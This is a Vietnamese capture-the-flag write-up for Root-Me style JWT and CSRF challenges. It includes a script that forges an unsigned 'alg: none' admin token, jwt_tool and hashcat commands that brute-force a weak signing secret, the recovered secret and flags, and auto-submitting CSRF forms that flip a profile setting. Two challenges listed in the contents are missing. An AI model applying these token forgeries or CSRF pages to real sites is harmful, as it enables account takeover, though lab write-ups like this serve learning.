# Trần Mạnh Huy - JWT - json web token
<hr>
# Table of content 

* [Chall 1: JSON Web Token (JWT) - Introduction](#chall-1-json-web-token-jwt---introduction)
* [Chall 2: JSON Web Token (JWT) - Weak secret](#chall-2-json-web-token-jwt---weak-secret)
* [Chall 3: JSON Web Token (JWT) - Public key](#chall-4-json-web-token-jwt---public-key) 
* [Chall 4: CSRF - 0 protection](#chall-4-csrf---0-protection)
* [Chall 5: CSRF - token bypass](#chall-5-csrf---token-bypass)

<hr>

## Chall 1: JSON Web Token (JWT) - Introduction
```
To validate the challenge, connect as admin.
```
Ta có login form như sau 

![image](https://user-images.githubusercontent.com/104350480/219703907-2e0197cf-93da-4230-a230-164f0473c52c.png)

Để ý có nhấn vào guest thử rồi check burp:

![image](https://user-images.githubusercontent.com/104350480/219705924-bb74b020-b6d7-48b5-a735-c662ef36634e.png)

Sửa thử username = admin thì server trả về lỗi: 

![image](https://user-images.githubusercontent.com/104350480/219708136-04c02ff0-8a0f-4ce9-891f-fee65f60067a.png)



Thế thì ta chỉnh alg = none vì để none thì server sẽ kh xác thực signature nữa, ta xóa phần signature cũng được và lỗi cũng biến mất, ta được kết quả.

![image](https://user-images.githubusercontent.com/104350480/219706460-833ef24c-d343-48b9-9eff-aa7d2a16d3ae.png)

> flag: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7

```
import base64
import json

header = {'typ':'JWT', 'alg':'none'}
payload = {'username':'admin'}
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode('utf-8').rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode('utf-8').rstrip('=')
data = header_encoded +'.'+payload_encoded+'.'
print(data)
```

## Chall 2: JSON Web Token (JWT) - Weak secret

```
"Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."

```

![image](https://user-images.githubusercontent.com/104350480/219711939-05cb4769-bdef-4024-aea3-2e92e5ffb132.png)

Mở đường dẫn /token ta có token:

> Here is your token	"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"

![image](https://user-images.githubusercontent.com/104350480/219831488-82906321-0618-429f-a177-6ed253af0c4f.png)


Chuyển sang phương thức POST /admin, ta có: 

![image](https://user-images.githubusercontent.com/104350480/219831018-a2a1142c-255f-42ca-a9b4-9a897db12daf.png)

Thêm Authorization vào xem được gì nào: 

![image](https://user-images.githubusercontent.com/104350480/219831273-213e8862-495d-4558-b382-0bd9f36e0e7a.png)

Bài này dùng alg: HS512, thì như tên bài thì có vẻ secret key khá yếu, dùng tool để bruteforce xem sao: Ở đây ta dùng jwt_tool với list đơn giản
từ rockyou.txt

> payload: python3 jwt_tool.py --token --C -d /usr/share/wordlists/rockyou.txt 

![image](https://user-images.githubusercontent.com/104350480/219830868-0655a46b-6375-4fa5-bab8-da0cac9e3afd.png)

Oke vậy là ta có được secretkey là lol, giờ ném lên jwt.io chỉnh lại payload thành admin và thêm secretkey lol là xong: 

![image](https://user-images.githubusercontent.com/104350480/219832730-a58fad6e-e2cb-48c3-a422-c3b4d957b817.png)

> Flag: PleaseUseAStrongSecretNextTime
 
Hoặc có thể dùng cách khác để bruteforce khá đơn giản là dùng hashcat

>payload: hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt --force

> https://hashcat.net/wiki/doku.php?id=example_hashes

![image](https://user-images.githubusercontent.com/104350480/219835386-3adb6412-afff-454e-80fa-f1b89997c6ba.png)

Ta cũng có được secretkey tương ứng là lol

![image](https://user-images.githubusercontent.com/104350480/219836351-03ba3270-2447-4a15-a901-d7d27cab47c5.png)

## Chall 4: CSRF - 0 protection

Mở vào chall là có:

![image](https://user-images.githubusercontent.com/104350480/219910186-addd360d-2a09-4472-9427-149f8b36bcea.png)

Vì là dạng csrf nên chưa khai thác được gì, ta register rồi đăng nhập vào trang thì được

![image](https://user-images.githubusercontent.com/104350480/219910295-afb165e6-3a6a-42d3-a3c1-2446afbfee15.png)

Mục tiêu bây giờ là phải xem được thông tin private, hay phải bật được status on của mình chỗ profile:

![image](https://user-images.githubusercontent.com/104350480/219911520-c7c9b76e-6368-4759-acd4-0e105050cada.png)

Ta có thể để ý status đang bị disabled, ta có thể sửa lại thành value="on", nhưng tất nhiên là không thu được gì, server trả về "You're not admin"

![image](https://user-images.githubusercontent.com/104350480/219912788-791a0026-95e1-4087-aca3-860e82f9efb1.png)

Bây giờ ta cần gửi 1 form tương tự để lừa admin kick vào link ta gửi. Lấy luôn source code từ trang và thêm link trang vào phần action:

```
<form id="profile" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
			<div>
			<label>Username:</label>
			<input id="username" type="text" name="username" value="huy123456">
			</div>
			<br>		
			<div>
			<label>Status:</label>
			<input id="status" type="checkbox" name="status" value="on" >
			</div>
			<br>
			<input id="token" type="hidden" name="token" value="dd29a211ad5ad8b6e426dde5150648dd" />
			<button type="submit">Submit</button>
			</form>
   <script>document.getElementById("profile").submit();</script>
   
   ```
 Sửa lại form 1 chút:
 
 ```
<html>
<head>
<script>
function loadform(){document.getElementById("formcsrf").submit()}
</script>
</head>
<body onload="loadform()">
<form id="formcsrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
<label>Username:</label>
<input id="username" type="text" name="username" value="huy123456">
<br>		
<label>Status:</label>
<input type="checkbox" name="status" value="on" checked>
<br>
</form>
</body>
</html>

```



